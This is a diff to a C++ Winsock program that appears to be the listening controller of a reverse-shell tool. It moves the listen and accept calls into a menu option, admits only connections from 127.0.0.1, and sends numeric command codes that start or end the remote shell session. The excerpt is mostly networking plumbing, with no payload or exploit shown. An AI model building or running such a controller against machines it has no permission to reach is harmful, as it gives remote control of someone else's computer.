@@ -23,7 +23,10 @@ char os;
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 int socket_setup();
+string get_client_ip(SOCKET clientSocket);
+
 void send_data(SOCKET clientSocket, const string &data);
+void send_data(SOCKET clientSocket, int data);
 string receive_data(SOCKET clientSocket);
 
 void os_detection();
@@ -46,14 +49,32 @@ int main(int argc, char *argv[])
         switch (Get_menu_option())
         {
             case 1:
-            {
-                cout << "\n\nNEED To add code to download file from server to get\nip, verify if the comming connection is of that ip and then connect\n";
+            {   
+                if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
+                {
+                    std::cerr << "listen failed.\n";
+                    closesocket(listenSocket);
+                    WSACleanup();
+                    return 1;
+                }
+                
+                cout << "\n>> Waiting for incoming connections..." << endl;
+                clientSocket = accept(listenSocket, nullptr, nullptr);
+
+                if(get_client_ip(clientSocket) == "127.0.0.1") cout << ">> " << get_client_ip(clientSocket) << " connected." << endl;
+                else 
+                {
+                    cout << ">> " << get_client_ip(clientSocket) << " Not allowed to connect." << endl;
+                    closesocket(clientSocket);
+                }
                 system("pause");
                 break;
             }
             
             case 2:
             {
+                
+                send_data(clientSocket,2);
                 if(!Rev_Shell())
                 {
                     cout << endl << ">> Closing Rev Shell..\n";
@@ -64,7 +85,7 @@ int main(int argc, char *argv[])
         
             case 0:
             {
-                
+                send_data(clientSocket,0);
                 closesocket(clientSocket);
                 closesocket(listenSocket);
 
@@ -81,7 +102,7 @@ int main(int argc, char *argv[])
                 break;
             }
         }
-    }
+    }   
 
 
 
@@ -131,6 +152,16 @@ void send_data(SOCKET clientSocket, const string &data)                         
 {
     int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
     if (bytesSent == SOCKET_ERROR) cerr << "Send failed with error: " << WSAGetLastError() << endl;
+}
+
+void send_data(SOCKET clientSocket, int data)
+{
+    // Convert the integer to a byte stream
+    int bytesSent = send(clientSocket, reinterpret_cast<const char*>(&data), sizeof(data), 0);
+    if (bytesSent == SOCKET_ERROR) 
+    {
+        cerr << "Send failed with error: " << WSAGetLastError() << endl;
+    }
 }
 
 string receive_data(SOCKET clientSocket)
@@ -199,18 +230,6 @@ bool getdata_from_file()
 
 int Rev_Shell()
 {
-    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
-    {
-        std::cerr << "listen failed.\n";
-        closesocket(listenSocket);
-        WSACleanup();
-        return 1;
-    }
-    
-    cout << "\n>> Waiting for incoming connections..." << endl;
-    SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);
-    
-    cout << ">> Client connected!" << endl << "_______________________________________________________________\n\n\n";
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     atomic<bool> processFinished(false);
@@ -291,4 +310,19 @@ int Get_menu_option()
     cout << ">> ";
     cin >> option;
     return option;
+}
+
+string get_client_ip(SOCKET clientSocket)
+{
+    sockaddr_in clientAddr;
+    int clientAddrLen = sizeof(clientAddr);
+    if (getpeername(clientSocket, (sockaddr*)&clientAddr, &clientAddrLen) == SOCKET_ERROR) {
+        cerr << "getpeername failed." << endl;
+        return "";
+    }
+
+    // Convert IP address to string
+    char clientIP[INET_ADDRSTRLEN];
+    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, sizeof(clientIP));
+    return string(clientIP);
 }
